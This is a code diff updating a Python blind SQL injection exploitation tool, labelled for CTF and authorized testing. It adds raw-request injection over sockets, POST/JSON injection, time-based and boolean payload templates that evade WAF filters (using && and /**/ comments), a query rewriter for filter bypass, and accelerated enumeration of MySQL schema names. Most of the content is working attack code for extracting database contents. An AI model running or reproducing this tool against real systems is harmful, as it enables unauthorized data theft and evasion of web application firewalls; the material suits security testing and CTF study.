@@ -5,7 +5,9 @@
 适用范围：CTF / 授权测试 / 本地靶场
 
 特性：
-- GET / POST
+- 支持 GET / POST 注入：POST 兼容表单体与 JSON 体，可附加其它字段，URL 查询串自动保留
+- 支持原始请求注入（--raw-request / -u 内含 *）：按字节原样发送、不做 URL 编码，
+  可把 payload 注入到请求行 / URL / REQUEST_URI 等任意位置，适配绕过编码与 WAF 的题目
 - Header / Cookie / Proxy
 - requests.Session 连接复用
 - 线程本地 Session
@@ -29,21 +31,25 @@
 """
 
 import argparse
+import gzip
 import random
 import re
 from difflib import SequenceMatcher
+import socket
+import ssl
 import string
 import sys
 import os
 import threading
 import time
+import zlib
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from dataclasses import dataclass, field
-from datetime import datetime
+from datetime import datetime, timedelta
 from pathlib import Path
 from threading import Lock
 from typing import Dict, List, Literal, Optional, Tuple, Union
-from urllib.parse import quote, urlsplit, urlunsplit
+from urllib.parse import parse_qsl, quote, urlencode, urlsplit, urlunsplit
 
 import hashlib
 import json
@@ -54,7 +60,7 @@ import urllib.request
 
 import requests
 
-__version__ = "1.6.0"
+__version__ = "1.10.0"
 DEFAULT_UA = (
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
     "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
@@ -488,6 +494,14 @@ DEFAULT_SLEEP_TIME = 5.0
 DEFAULT_TIME_PAYLOAD = "1 and if(ascii(substr(({query}),{i},1))>{mid},sleep({sleep}),0)"
 DEFAULT_TIME_EQ_PAYLOAD = "1 and if(ascii(substr(({query}),{i},1))={mid},sleep({sleep}),0)"
 DEFAULT_TIME_LEN_PAYLOAD = "1 and if(length(({query}))>{mid},sleep({sleep}),0)"
+
+# 库名枚举时的系统库预判：库名前缀命中系统库名即直接补全，省去长名字的逐位猜解
+DEFAULT_DB_PREDICT_PREFIX = 3
+
+# --preset uri：注入点在 URL / REQUEST_URI，且 WAF 过滤关键字、请求行不能有空格、查询串不能有 =
+URI_TIME_PAYLOAD = "x',if(ascii(substr(({query}),{i},1))>{mid},sleep({sleep}),0))#"
+URI_TIME_EQ_PAYLOAD = "x',if(ascii(substr(({query}),{i},1))like/**/{mid},sleep({sleep}),0))#"
+URI_TIME_LEN_PAYLOAD = "x',if(length(({query}))>{mid},sleep({sleep}),0))#"
 UNKNOWN = "?"
 CharResult = Union[str, Literal["?"]]
 
@@ -514,6 +528,10 @@ class Config:
     length_threshold: Optional[float]
     status_code: Optional[int]
     method: str
+    base_params: Dict[str, str]
+    data: Dict[str, str]
+    json_body: bool
+    content_type: Optional[str]
     timeout: float
     retries: int
     delay: float
@@ -546,6 +564,13 @@ class Config:
     time_payload: Optional[str] = None
     time_eq_payload: Optional[str] = None
     time_len_payload: Optional[str] = None
+    waf_safe: bool = False
+    db_predict: bool = True
+    db_predict_prefix: int = DEFAULT_DB_PREDICT_PREFIX
+    raw_template: Optional[str] = None
+    raw_host: str = ""
+    raw_port: int = 80
+    raw_tls: bool = False
     sorted_chars: List[str] = field(default_factory=list)
 
     def __post_init__(self) -> None:
@@ -590,20 +615,231 @@ def get_thread_session(cfg: Config) -> requests.Session:
     return thread_local.session
 
 
-def send_raw(session: requests.Session, cfg: Config, payload: str) -> Optional[requests.Response]:
+class RawResponse:
+    """最小响应对象，字段与 requests.Response 在脚本中被用到的部分保持一致。"""
+
+    __slots__ = ("status_code", "text", "headers", "elapsed", "url")
+
+    def __init__(self, status_code: int, text: str, headers: Dict[str, str], elapsed: float, url: str = ""):
+        self.status_code = status_code
+        self.text = text
+        self.headers = headers
+        self.elapsed = timedelta(seconds=elapsed)
+        self.url = url
+
+
+def _split_url_raw(url: str) -> Tuple[str, str, str]:
+    """按原始字符串切分 URL（不走 urlsplit，避免 # 被当成分片而丢失）。"""
+    m = re.match(r"^([a-zA-Z][a-zA-Z0-9+.\-]*)://([^/?#]*)(.*)$", url)
+    if not m:
+        raise ValueError(f"无法解析 URL: {url!r}（原始注入模式的 -u 需要形如 http://host/path?query）")
+    scheme, netloc, rest = m.group(1), m.group(2), m.group(3)
+    if not rest.startswith("/"):
+        rest = "/" + rest
+    return scheme, netloc, rest
+
+
+def _template_target(template: str, force_tls: bool) -> Tuple[str, int, bool]:
+    """从原始请求模板解析 主机 / 端口 / 是否 TLS。"""
+    host_header = ""
+    for line in re.split(r"\r?\n", template):
+        if line.lower().startswith("host:"):
+            host_header = line.split(":", 1)[1].strip()
+            break
+    if not host_header:
+        raise ValueError("原始请求模板缺少 Host 头，无法确定目标主机")
+    tls = force_tls
+    first = template.strip().splitlines()[0] if template.strip() else ""
+    m = re.match(r"^[A-Z]+\s+([a-zA-Z][a-zA-Z0-9+.\-]*)://", first)
+    if m:
+        tls = m.group(1).lower() == "https"
+    host, _, port_s = host_header.partition(":")
+    if port_s.isdigit():
+        port = int(port_s)
+    else:
+        port = 443 if tls else 80
+    return host, port, tls
+
+
+def _compose_raw_template(method: str, netloc: str, target: str, headers: Dict[str, str],
+                          cookies: Dict[str, str], data: Dict[str, str]) -> str:
+    """用 -u / --method / --data 拼出一个原始请求模板（target 中可含 * 注入标记）。"""
+    lines = [f"{method.upper()} {target} HTTP/1.1", f"Host: {netloc}"]
+    lower = {k.lower() for k in headers}
+    if "user-agent" not in lower:
+        lines.append(f"User-Agent: {DEFAULT_UA}")
+    body = urlencode(data) if (method.upper() != "GET" and data) else ""
+    if method.upper() != "GET":
+        if "content-type" not in lower:
+            lines.append("Content-Type: application/x-www-form-urlencoded")
+        lines.append(f"Content-Length: {len(body.encode('utf-8'))}")
+    if cookies and "cookie" not in lower:
+        lines.append("Cookie: " + "; ".join(f"{k}={v}" for k, v in cookies.items()))
+    lines.extend(f"{k}: {v}" for k, v in headers.items())
+    lines.append("Connection: close")
+    return "\r\n".join(lines) + "\r\n\r\n" + body
+
+
+def _render_raw_request(template: str, payload: str) -> bytes:
+    """把 payload 填进模板的 * 处，并自动修正 Content-Length。"""
+    if "\r" in payload or "\n" in payload:
+        raise ValueError("原始请求模式下 payload 不能包含换行符（有请求头注入风险）")
+    text = template.replace("*", payload).replace("\r\n", "\n").replace("\r", "\n")
+    head, _, body = text.partition("\n\n")
+    body_bytes = body.encode("utf-8", "surrogateescape")
+    out_lines = []
+    for line in head.split("\n"):
+        if line.lower().startswith("content-length:"):
+            out_lines.append(f"Content-Length: {len(body_bytes)}")
+        else:
+            out_lines.append(line)
+    return ("\r\n".join(out_lines) + "\r\n\r\n").encode("utf-8", "surrogateescape") + body_bytes
+
+
+def _read_chunked(sock: socket.socket, buf: bytes) -> bytes:
+    out = b""
+    while True:
+        while b"\r\n" not in buf:
+            chunk = sock.recv(8192)
+            if not chunk:
+                return out
+            buf += chunk
+        line, _, buf = buf.partition(b"\r\n")
+        try:
+            size = int(line.split(b";")[0].strip() or b"0", 16)
+        except ValueError:
+            return out
+        if size == 0:
+            return out
+        while len(buf) < size + 2:
+            chunk = sock.recv(8192)
+            if not chunk:
+                return out
+            buf += chunk
+        out += buf[:size]
+        buf = buf[size + 2:]
+
+
+def _recv_http_response(sock: socket.socket, timeout: float) -> Tuple[int, str, Dict[str, str]]:
+    sock.settimeout(timeout)
+    buf = b""
+    while b"\r\n\r\n" not in buf:
+        chunk = sock.recv(8192)
+        if not chunk:
+            break
+        buf += chunk
+    head, _, rest = buf.partition(b"\r\n\r\n")
+    lines = head.decode("iso-8859-1", "replace").split("\r\n")
+    status_code = 0
+    if lines and len(lines[0].split()) >= 2 and lines[0].split()[1].isdigit():
+        status_code = int(lines[0].split()[1])
+    headers: Dict[str, str] = {}
+    for line in lines[1:]:
+        if ":" in line:
+            k, v = line.split(":", 1)
+            headers[k.strip().lower()] = v.strip()
+
+    te = headers.get("transfer-encoding", "").lower()
+    if "chunked" in te:
+        body = _read_chunked(sock, rest)
+    elif "content-length" in headers:
+        need = int(headers["content-length"])
+        body = rest
+        while len(body) < need:
+            chunk = sock.recv(8192)
+            if not chunk:
+                break
+            body += chunk
+        body = body[:need]
+    else:
+        body = rest
+        while True:
+            try:
+                chunk = sock.recv(8192)
+            except socket.timeout:
+                break
+            if not chunk:
+                break
+            body += chunk
+
+    enc = headers.get("content-encoding", "").lower()
+    try:
+        if "gzip" in enc:
+            body = gzip.decompress(body)
+        elif "deflate" in enc:
+            try:
+                body = zlib.decompress(body)
+            except zlib.error:
+                body = zlib.decompress(body, -zlib.MAX_WBITS)
+    except Exception:
+        pass
+    return status_code, body.decode("utf-8", "replace"), headers
+
+
+def send_raw_template(cfg: Config, payload: str) -> Optional[RawResponse]:
+    """原始请求模式：按模板原样发送，payload 替换模板中的 *（不做 URL 编码）。"""
     for attempt in range(1, cfg.retries + 1):
         sleep_before_request(cfg.delay, cfg.jitter)
         try:
+            request_bytes = _render_raw_request(cfg.raw_template or "", payload)
+            t0 = time.time()
+            raw_sock = socket.create_connection((cfg.raw_host, cfg.raw_port), timeout=cfg.timeout)
+            if cfg.raw_tls:
+                ctx = ssl.create_default_context()
+                if not cfg.verify:
+                    ctx.check_hostname = False
+                    ctx.verify_mode = ssl.CERT_NONE
+                raw_sock = ctx.wrap_socket(raw_sock, server_hostname=cfg.raw_host)
+            try:
+                raw_sock.sendall(request_bytes)
+                status, text, headers = _recv_http_response(raw_sock, cfg.timeout)
+            finally:
+                raw_sock.close()
+            elapsed = time.time() - t0
+            if cfg.verbose:
+                with print_lock:
+                    print(f"\n[debug][raw] {payload} => status={status}, len={len(text)}, {elapsed:.2f}s")
+            return RawResponse(status, text, headers, elapsed, url=f"{cfg.raw_host}:{cfg.raw_port}")
+        except (OSError, ValueError, ssl.SSLError) as e:
+            if cfg.verbose:
+                with print_lock:
+                    print(f"\n[debug][raw] 请求失败 attempt={attempt}/{cfg.retries}: {e}")
+            if attempt < cfg.retries:
+                time.sleep(min(1.0 * attempt, 3.0))
+    return None
+
+
+def send_raw(session: requests.Session, cfg: Config, payload: str) -> Optional[requests.Response]:
+    if cfg.raw_template:
+        return send_raw_template(cfg, payload)
+    for attempt in range(1, cfg.retries + 1):
+        sleep_before_request(cfg.delay, cfg.jitter)
+        try:
+            headers = dict(cfg.headers)
             kwargs = dict(
-                headers=cfg.headers,
+                headers=headers,
                 cookies=cfg.cookies,
                 proxies=cfg.proxies,
                 timeout=cfg.timeout,
             )
             if cfg.method.upper() == "GET":
-                resp = session.get(cfg.url, params={cfg.param: payload}, **kwargs)
+                # GET：URL 查询串（去掉注入参数后的残余）+ 额外 data + 注入参数，统一走 params
+                params = dict(cfg.base_params)
+                params.update(cfg.data)
+                params[cfg.param] = payload
+                resp = session.get(cfg.url, params=params, **kwargs)
             else:
-                resp = session.post(cfg.url, data={cfg.param: payload}, **kwargs)
+                # POST：原有查询串作为 URL 参数保留，注入参数与额外字段放入请求体
+                if cfg.base_params:
+                    kwargs["params"] = dict(cfg.base_params)
+                body = dict(cfg.data)
+                body[cfg.param] = payload
+                if cfg.json_body:
+                    resp = session.post(cfg.url, json=body, **kwargs)
+                else:
+                    if cfg.content_type and "Content-Type" not in headers:
+                        headers["Content-Type"] = cfg.content_type
+                    resp = session.post(cfg.url, data=body, **kwargs)
 
             if cfg.verbose:
                 with print_lock:
@@ -658,6 +894,54 @@ def normalize_text(text: str, limit: int) -> str:
     text = _HTML_COMMENT_RE.sub("", text)
     text = _WS_RE.sub(" ", text)
     return text.strip()
+
+
+def rewrite_sql_waf_safe(sql: str) -> str:
+    """把普通 SQL 改写成可绕过“空格/and/反引号”类 WAF 的形式。
+
+    处理仅作用于单引号字符串之外：
+    - 连续空白 -> MySQL 注释 /**/
+    - 独立的关键字 and -> &&
+    该函数是幂等的，重复调用不会二次改写。
+    """
+    out: List[str] = []
+    i = 0
+    n = len(sql)
+    while i < n:
+        ch = sql[i]
+        if ch == "'":
+            # 原样保留单引号字符串，兼容 MySQL 的 '' 转义与反斜杠转义
+            j = i + 1
+            while j < n:
+                if sql[j] == "\\":
+                    j += 2
+                    continue
+                if sql[j] == "'":
+                    if j + 1 < n and sql[j + 1] == "'":
+                        j += 2
+                        continue
+                    j += 1
+                    break
+                j += 1
+            out.append(sql[i:j])
+            i = j
+            continue
+        if ch.isspace():
+            while i < n and sql[i].isspace():
+                i += 1
+            out.append("/**/")
+            continue
+        if (
+            sql[i : i + 3].lower() == "and"
+            and (i == 0 or not (sql[i - 1].isalnum() or sql[i - 1] == "_"))
+            and (i + 3 >= n or not (sql[i + 3].isalnum() or sql[i + 3] == "_"))
+        ):
+            out.append("&&")
+            i += 3
+            continue
+        out.append(ch)
+        i += 1
+    return "".join(out)
 
 
 def lcs2(a: str, b: str, limit: int) -> str:
@@ -1033,6 +1317,18 @@ def verify_auto_feature(session: requests.Session, cfg: Config, pairs: int = 2) 
     return True
 
 
+_WAF_SAFE_CLOSURE_NAMES = {
+    "numeric-andand",
+    "single-quote-andand",
+    "double-quote-andand",
+}
+_WAF_SAFE_TIME_CLOSURE_NAMES = {
+    "numeric-andand-time",
+    "single-quote-andand-time",
+    "double-quote-andand-time",
+}
+
+
 def closure_candidates() -> List[Tuple[str, str, str, str]]:
     """
     基础闭合候选。
@@ -1076,6 +1372,24 @@ def closure_candidates() -> List[Tuple[str, str, str, str]]:
             '1") and {expr}-- -',
             '1") and ascii(substr(({query}),{i},1))>{mid}-- -',
             '1") and ascii(substr(({query}),{i},1))={mid}-- -',
+        ),
+        (
+            "numeric-andand",
+            "1&&{expr}",
+            "1&&ascii(substr(({query}),{i},1))>{mid}",
+            "1&&ascii(substr(({query}),{i},1))={mid}",
+        ),
+        (
+            "single-quote-andand",
+            "1'&&{expr}&&'1",
+            "1'&&ascii(substr(({query}),{i},1))>{mid}&&'1",
+            "1'&&ascii(substr(({query}),{i},1))={mid}&&'1",
+        ),
+        (
+            "double-quote-andand",
+            '1"&&{expr}&&"1',
+            '1"&&ascii(substr(({query}),{i},1))>{mid}&&"1',
+            '1"&&ascii(substr(({query}),{i},1))={mid}&&"1',
         ),
     ]
 
@@ -1137,6 +1451,8 @@ def probe_closure(session: requests.Session, cfg: Config, samples: int = 2) -> b
     original_len_payload = cfg.len_payload
 
     for name, bool_tpl, gt_tpl, eq_tpl in closure_candidates():
+        if cfg.waf_safe and name not in _WAF_SAFE_CLOSURE_NAMES:
+            continue
         true_payload = bool_tpl.format(expr=DEFAULT_CLOSURE_TEST_EXPR_TRUE)
         false_payload = bool_tpl.format(expr=DEFAULT_CLOSURE_TEST_EXPR_FALSE)
 
@@ -1163,6 +1479,10 @@ def probe_closure(session: requests.Session, cfg: Config, samples: int = 2) -> b
             cfg.true_payload = bool_tpl.format(expr=DEFAULT_CLOSURE_TEST_EXPR_TRUE)
             cfg.false_payload = bool_tpl.format(expr=DEFAULT_CLOSURE_TEST_EXPR_FALSE)
             print(f"[+] 闭合方式探测成功: {name}")
+            if name in _WAF_SAFE_CLOSURE_NAMES:
+                cfg.waf_safe = True
+                cfg.query = rewrite_sql_waf_safe(cfg.query)
+                print("[+] 检测到空格/关键字型过滤，已自动切换 && 模式并压缩查询串空白。")
             if cfg.verbose:
                 print(f"[debug] payload     = {cfg.payload}")
                 print(f"[debug] eq_payload  = {cfg.eq_payload}")
@@ -1220,6 +1540,24 @@ def time_closure_candidates() -> List[Tuple[str, str, str, str]]:
             '1") and if(ascii(substr(({query}),{i},1))>{mid},sleep({sleep}),0)-- -',
             '1") and if(ascii(substr(({query}),{i},1))={mid},sleep({sleep}),0)-- -',
         ),
+        (
+            "numeric-andand-time",
+            "1&&if({expr},sleep({sleep}),0)",
+            "1&&if(ascii(substr(({query}),{i},1))>{mid},sleep({sleep}),0)",
+            "1&&if(ascii(substr(({query}),{i},1))={mid},sleep({sleep}),0)",
+        ),
+        (
+            "single-quote-andand-time",
+            "1'&&if({expr},sleep({sleep}),0)&&'1",
+            "1'&&if(ascii(substr(({query}),{i},1))>{mid},sleep({sleep}),0)&&'1",
+            "1'&&if(ascii(substr(({query}),{i},1))={mid},sleep({sleep}),0)&&'1",
+        ),
+        (
+            "double-quote-andand-time",
+            '1"&&if({expr},sleep({sleep}),0)&&"1',
+            '1"&&if(ascii(substr(({query}),{i},1))>{mid},sleep({sleep}),0)&&"1',
+            '1"&&if(ascii(substr(({query}),{i},1))={mid},sleep({sleep}),0)&&"1',
+        ),
     ]
 
 
@@ -1238,6 +1576,8 @@ def probe_closure_time(session: requests.Session, cfg: Config, samples: int = 2)
     threshold = cfg.sleep_time * 0.8
 
     for name, bool_tpl, gt_tpl, eq_tpl in time_closure_candidates():
+        if cfg.waf_safe and name not in _WAF_SAFE_TIME_CLOSURE_NAMES:
+            continue
         true_payload = bool_tpl.format(expr="1=1", sleep=cfg.sleep_time)
         false_payload = bool_tpl.format(expr="1=2", sleep=cfg.sleep_time)
 
@@ -1267,6 +1607,10 @@ def probe_closure_time(session: requests.Session, cfg: Config, samples: int = 2)
             cfg.true_payload = bool_tpl.format(expr="1=1", sleep=cfg.sleep_time)
             cfg.false_payload = bool_tpl.format(expr="1=2", sleep=cfg.sleep_time)
             print(f"[+] 闭合方式探测成功（时间盲注）: {name}")
+            if name in _WAF_SAFE_TIME_CLOSURE_NAMES:
+                cfg.waf_safe = True
+                cfg.query = rewrite_sql_waf_safe(cfg.query)
+                print("[+] 检测到空格/关键字型过滤，已自动切换 && 模式并压缩查询串空白。")
             if cfg.verbose:
                 print(f"[debug] payload     = {cfg.payload}")
                 print(f"[debug] eq_payload  = {cfg.eq_payload}")
@@ -1423,6 +1767,8 @@ def extract_query(
     show_result: bool = True,
 ) -> str:
     """在已完成特征探测的基础上，提取单条查询的结果。"""
+    if cfg.waf_safe:
+        query = rewrite_sql_waf_safe(query)
     cfg.query = query
     length = cfg.max_len
 
@@ -1449,44 +1795,68 @@ def extract_query(
         return final
 
     if cfg.threads <= 1:
+        consecutive_fail = 0
         for pos in pending:
             ch = binary_search_ascii(session, cfg, pos)
             if ch is None:
-                print(f"\n[!] 第 {pos} 位请求失败，中止。")
-                break
+                # 单次请求失败不再整体中止，标记为未确定，交给结尾的单线程复核重试
+                result_chars[pos - 1] = UNKNOWN
+                consecutive_fail += 1
+                print(f"\n[!] 第 {pos} 位请求失败，先标记为未确定，稍后重试。")
+                if consecutive_fail >= 5:
+                    print("[!] 连续 5 位请求失败，目标可能已下线或被限流，提前结束。")
+                    break
+                continue
+            consecutive_fail = 0
             result_chars[pos - 1] = ch
             saver.maybe_save()
             partial = "".join(c if c is not None else UNKNOWN for c in result_chars)
             completed = sum(1 for c in result_chars if c is not None)
             print_progress(completed, length, partial)
         saver.maybe_save(force=True)
-        final = "".join(ch or UNKNOWN for ch in result_chars)
-        if show_result:
-            print_result(final)
-        return final
+    else:
+        def worker(pos: int) -> Tuple[int, Optional[CharResult]]:
+            return pos, binary_search_ascii(get_thread_session(cfg), cfg, pos)
 
-    def worker(pos: int) -> Tuple[int, Optional[CharResult]]:
-        return pos, binary_search_ascii(get_thread_session(cfg), cfg, pos)
-
-    completed = sum(1 for c in result_chars if c is not None)
-    with ThreadPoolExecutor(max_workers=cfg.threads) as executor:
-        futures = {executor.submit(worker, pos): pos for pos in pending}
-        for future in as_completed(futures):
-            pos = futures[future]
-            try:
-                _, ch = future.result()
-            except Exception as e:
-                ch = None
+        completed = sum(1 for c in result_chars if c is not None)
+        with ThreadPoolExecutor(max_workers=cfg.threads) as executor:
+            futures = {executor.submit(worker, pos): pos for pos in pending}
+            for future in as_completed(futures):
+                pos = futures[future]
+                try:
+                    _, ch = future.result()
+                except Exception as e:
+                    ch = None
+                    with print_lock:
+                        print(f"\n[!] 第 {pos} 位线程异常: {e}")
+                result_chars[pos - 1] = ch if ch is not None else UNKNOWN
+                completed += 1
+                saver.maybe_save()
+                partial = "".join(c if c is not None else UNKNOWN for c in result_chars)
                 with print_lock:
-                    print(f"\n[!] 第 {pos} 位线程异常: {e}")
-            result_chars[pos - 1] = ch if ch is not None else UNKNOWN
-            completed += 1
-            saver.maybe_save()
-            partial = "".join(c if c is not None else UNKNOWN for c in result_chars)
-            with print_lock:
-                print_progress(completed, length, partial)
+                    print_progress(completed, length, partial)
+        saver.maybe_save(force=True)
 
-    saver.maybe_save(force=True)
+    # 并发/偶发噪声会让个别位停在 UNKNOWN(?)，这里用单线程逐位复核重试
+    for _ in range(2):
+        unknown_positions = [i for i in range(1, length + 1) if result_chars[i - 1] in (None, UNKNOWN)]
+        if not unknown_positions:
+            break
+        print(f"\n[*] 有 {len(unknown_positions)} 位未确定，单线程重试...")
+        saved_threads = cfg.threads
+        cfg.threads = 1
+        try:
+            for pos in unknown_positions:
+                ch = binary_search_ascii(session, cfg, pos)
+                if ch not in (None, UNKNOWN):
+                    result_chars[pos - 1] = ch
+                    completed = sum(1 for c in result_chars if c is not None)
+                    partial = "".join(c if c is not None else UNKNOWN for c in result_chars)
+                    print_progress(completed, length, partial)
+        finally:
+            cfg.threads = saved_threads
+        saver.maybe_save(force=True)
+
     final = "".join(ch or UNKNOWN for ch in result_chars)
     if show_result:
         print_result(final)
@@ -1504,6 +1874,9 @@ def _setup_time_based(cfg: Config) -> None:
     cfg.payload = cfg.time_payload
     cfg.eq_payload = cfg.time_eq_payload
     cfg.len_payload = cfg.time_len_payload
+    if cfg.threads > 1:
+        print(f"[!] 时间盲注依赖响应耗时，多线程会互相干扰导致误判，已自动改为单线程（-t 1）。")
+        cfg.threads = 1
     min_timeout = cfg.sleep_time + 5.0
     if cfg.timeout < min_timeout:
         print(f"[*] 时间盲注模式：自动调整 timeout {cfg.timeout}s -> {min_timeout}s")
@@ -1521,7 +1894,14 @@ def extract(cfg: Config) -> str:
         if cfg.probe_closure:
             probe_closure(main_session, cfg, samples=cfg.probe_samples)
         if cfg.auto_mark:
-            auto_detect_true_feature(main_session, cfg)
+            # 与 prepare_detection 保持一致：用永非空查询探测特征，
+            # 避免真实查询为空/表不存在时把特征识别误判为失败。
+            old_query = cfg.query
+            cfg.query = "select/**/1"
+            try:
+                auto_detect_true_feature(main_session, cfg)
+            finally:
+                cfg.query = old_query
 
     return extract_query(main_session, cfg, cfg.query)
 
@@ -1540,6 +1920,13 @@ def esc_sql(value: str) -> str:
 def esc_ident(value: str) -> str:
     """MySQL 反引号标识符转义（反引号翻倍）。"""
     return value.replace("`", "``")
+
+
+def esc_ident_safe(value: str) -> str:
+    """waf-safe 模式下的标识符输出：普通名称直接裸用，避开反引号。"""
+    if re.fullmatch(r"[A-Za-z0-9_]+", value):
+        return value
+    return esc_ident(value)
 
 
 def split_value(text: str) -> List[str]:
@@ -1572,6 +1959,193 @@ def extract_value(
         return value
     finally:
         cfg.max_len = old_cap
+
+
+# 系统库预判名单：库名提取到前缀后，若只可能对应其中一个，就直接补全整个库名。
+# 名字均按 3 位前缀唯一（inf / mys / per / sys），所以默认前缀阈值取 3。
+_PREDICT_DB_NAMES: Tuple[str, ...] = (
+    "information_schema",
+    "performance_schema",
+    "mysql",
+    "sys",
+)
+# group_concat(... SEPARATOR 0x7c) 用 | 分隔；部分题目/自定义查询用逗号，这里都当作库名分隔符
+_DB_NAME_SEPARATORS = ("|", ",")
+
+
+def predict_db_candidates(prefix: str, exclude: Optional[set] = None) -> List[str]:
+    """返回以 prefix 开头、且尚未提取过的系统库名候选（忽略大小写）。"""
+    lp = (prefix or "").lower()
+    if not lp:
+        return []
+    seen = {s.lower() for s in (exclude or set())}
+    return [
+        name
+        for name in _PREDICT_DB_NAMES
+        if name.lower().startswith(lp) and name.lower() not in seen
+    ]
+
+
+def verify_db_boundary(
+    session: requests.Session,
+    cfg: Config,
+    name: str,
+    start: int,
+    length: int,
+    chars: List[Optional[str]],
+) -> bool:
+    """校验预判出的库名 name 是否确实起始于 start 位。
+
+    预判只信任已提取的前缀，这里再用 1~2 次等值请求确认名称边界：名称后一位必须
+    是分隔符，或名称恰好落在结果末尾。这样 sysadmin 之类的用户库不会被误判成 sys。
+    """
+    if start + len(name) - 1 > length:
+        return False  # 名称放不下，说明不是它
+    boundary = start + len(name)
+    if boundary > length:
+        return True  # 名称正好到结果末尾
+    ch = chars[boundary - 1]
+    if ch not in (None, UNKNOWN):
+        return ch in _DB_NAME_SEPARATORS
+    for sep in _DB_NAME_SEPARATORS:
+        result = ascii_eq(session, cfg, boundary, ord(sep))
+        if result:
+            chars[boundary - 1] = sep
+            return True
+        if result is None:
+            # 请求失败无法确认边界，放弃本次预判，交给普通逐位提取保证正确性
+            return False
+    return False
+
+
+def extract_query_predict_db(session: requests.Session, cfg: Config, query: str) -> str:
+    """库名专用提取：普通逐位猜解 + 系统库名预判。
+
+    预判策略：
+      1. 顺序提取库名字符，某个库名累计到前 N 位（默认 3，见 --db-predict-len）后，
+         若该前缀只对应一个系统库名，就进入预判；
+      2. 先用 1~2 次请求校验边界（名称后必须是分隔符或结果末尾），通过则直接补全
+         整个库名并跳过剩余位；
+      3. 已提取过的库名不会再次预判（避免同一个系统库被反复补全）。
+    预判失败（边界不符）时该库名退回普通逐位提取，结果不受影响。
+    """
+    if cfg.waf_safe:
+        query = rewrite_sql_waf_safe(query)
+    cfg.query = query
+    length = cfg.max_len
+
+    if not cfg.no_length_detect:
+        detected = detect_length(session, cfg)
+        if detected is None:
+            print("[!] 长度探测失败，改用 max_len 继续。")
+        else:
+            length = detected
+
+    if length <= 0:
+        print("[+] 查询结果为空。")
+        return ""
+
+    chars: List[Optional[str]] = [None] * length
+    saver = ResumeSaver(cfg, chars)
+    print(
+        f"[*] 开始提取库名，共 {length} 位"
+        f"（系统库预判开启：前缀达到 {cfg.db_predict_prefix} 位后尝试预判，"
+        f"成功即补全、失败继续逐位注入；--db-predict-len 调整阈值，--no-db-predict 关闭）"
+    )
+
+    emitted: set = set()  # 本轮已确认的库名，已提取过的不再预判
+    i = 1
+    seg_start = 1
+    current = ""
+    seg_locked = False  # 该库名已确定不是系统库，后续不再尝试预判
+    predicted = 0
+
+    while i <= length:
+        ch = chars[i - 1]
+        if ch in (None, UNKNOWN):
+            got = binary_search_ascii(session, cfg, i)
+            chars[i - 1] = got if got is not None else UNKNOWN
+            ch = chars[i - 1]
+            saver.maybe_save()
+            completed = sum(1 for c in chars if c not in (None, UNKNOWN))
+            partial = "".join(c if c not in (None, UNKNOWN) else UNKNOWN for c in chars)
+            print_progress(completed, length, partial)
+
+        if ch in (None, UNKNOWN):
+            current += UNKNOWN
+            i += 1
+            continue
+
+        if ch in _DB_NAME_SEPARATORS:
+            if current and current != UNKNOWN:
+                emitted.add(current.lower())
+            current = ""
+            seg_start = i + 1
+            seg_locked = False
+            i += 1
+            continue
+
+        current += ch
+        if cfg.db_predict and not seg_locked:
+            candidates = predict_db_candidates(current, emitted)
+            target: Optional[str] = None
+            if not candidates:
+                seg_locked = True
+            else:
+                exact = next((n for n in candidates if n.lower() == current.lower()), None)
+                if exact:
+                    target = exact
+                elif len(current) >= cfg.db_predict_prefix and len(candidates) == 1:
+                    target = candidates[0]
+            if target:
+                if verify_db_boundary(session, cfg, target, seg_start, length, chars):
+                    fill = target[len(current):]
+                    for k, fill_ch in enumerate(fill):
+                        chars[i + k] = fill_ch  # 位置 i+1+k
+                    emitted.add(target.lower())
+                    predicted += 1
+                    skip_note = f"（跳过剩余 {len(fill)} 位猜解）" if fill else "（名称已完整）"
+                    print(f"\n[+] 系统库预判成功: {target} {skip_note}")
+                    current = target
+                    i = seg_start + len(target) - 1  # 指向名称最后一位，再 +=1 跳到分隔符
+                    saver.maybe_save(force=True)
+                else:
+                    seg_locked = True
+                    print(f"\n[·] 系统库预判失败: 前缀 {current!r} 与 {target} 边界不符，继续逐位注入。")
+        i += 1
+
+    # 结尾复核：偶发请求失败会让个别位停在 UNKNOWN，单线程重试
+    for _ in range(2):
+        unknown_positions = [k for k in range(1, length + 1) if chars[k - 1] in (None, UNKNOWN)]
+        if not unknown_positions:
+            break
+        print(f"\n[*] 有 {len(unknown_positions)} 位未确定，单线程重试...")
+        for pos in unknown_positions:
+            got = binary_search_ascii(session, cfg, pos)
+            if got not in (None, UNKNOWN):
+                chars[pos - 1] = got
+                completed = sum(1 for c in chars if c not in (None, UNKNOWN))
+                partial = "".join(c if c not in (None, UNKNOWN) else UNKNOWN for c in chars)
+                print_progress(completed, length, partial)
+        saver.maybe_save(force=True)
+
+    if predicted:
+        print(f"\n[+] 系统库预判成功 {predicted} 个库名。")
+    return "".join(ch or UNKNOWN for ch in chars)
+
+
+def extract_database_list(session: requests.Session, cfg: Config, label: str = "数据库列表") -> str:
+    """枚举库名列表。默认开启系统库预判，长系统库名不再逐位硬猜。"""
+    query = "select group_concat(schema_name SEPARATOR 0x7c) from information_schema.schemata"
+    if label:
+        print(f"\n[*] 提取 {label} ...")
+    if cfg.db_predict:
+        value = extract_query_predict_db(session, cfg, query)
+    else:
+        value = extract_query(session, cfg, query, use_resume=False, show_result=False)
+    if label:
+        print(f"[✓] {label} => {value}")
+    return value
 
 
 def result_stem(url: str) -> str:
@@ -1645,7 +2219,7 @@ def prepare_detection(session: requests.Session, cfg: Config) -> None:
     if cfg.auto_mark:
         # 探测用永非空查询，避免默认 -q 在目标上结果为空导致特征误判
         old_query = cfg.query
-        cfg.query = "select 1"
+        cfg.query = "select/**/1"
         try:
             auto_detect_true_feature(session, cfg)
         finally:
@@ -1677,12 +2251,7 @@ def dump_databases(cfg: Config, include_system: bool) -> None:
     report.append("=" * 50)
 
     print("\n[*] 开始自动枚举数据库...")
-    dbs_raw = extract_value(
-        session,
-        cfg,
-        "select group_concat(schema_name SEPARATOR 0x7c) from information_schema.schemata",
-        "数据库列表",
-    )
+    dbs_raw = extract_database_list(session, cfg)
     dbs = split_value(dbs_raw)
     if not dbs:
         print("[!] 未发现任何数据库。")
@@ -1735,8 +2304,8 @@ def dump_databases(cfg: Config, include_system: bool) -> None:
